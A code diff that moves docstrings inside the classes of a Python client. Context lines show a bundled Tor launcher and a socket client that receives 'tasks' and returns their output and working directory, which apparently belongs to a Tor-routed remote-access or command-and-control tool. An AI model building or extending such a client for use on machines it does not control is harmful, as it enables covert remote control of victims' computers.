@@ -7,11 +7,12 @@ import sys
 from time import sleep
 from random import randint
 
-"""
-A class to interact with the tor expert bundle.
-Note: The stem library could be used to interact with tor.
-"""
+
 class Tor:
+    """
+    A class to interact with the tor expert bundle.
+    Note: The stem library could be used to interact with tor.
+    """
     PATH = '.\\torbundle\\Tor\\tor.exe'
 
     def __init__(self):
@@ -35,10 +36,10 @@ class Tor:
         return os.path.join(base_path, relative_path)
 
 
-"""
-A class to handle the client socket.
-"""
 class ClientSocket:
+    """
+    A class to handle the client socket.
+    """
     ENCODING = 'utf-8'
     # timout in seconds between every connection try
     CONNECTION_TIMEOUT = 30
@@ -63,11 +64,11 @@ class ClientSocket:
         else:
             return sock
 
-    """
-    The client always sends back the output of the received task,
-    and the current working directory.
-    """
     def send(self, output):
+        """
+        The client always sends back the output of the received task,
+        and the current working directory.
+        """
         try:
             cwd = os.getcwd()
             data = {'output' : output, 'cwd' : cwd}
@@ -75,11 +76,11 @@ class ClientSocket:
         except socket.error:
             raise()
 
-    """
-    The client receives a dictionary containing a task,
-    and a list of optional arguments, dependent on the task.
-    """
     def receive(self, numBytes):
+        """
+        The client receives a dictionary containing a task,
+        and a list of optional arguments, dependent on the task.
+        """
         try:
             data = self.__sock.recv(numBytes)
             data = data.decode(self.ENCODING)
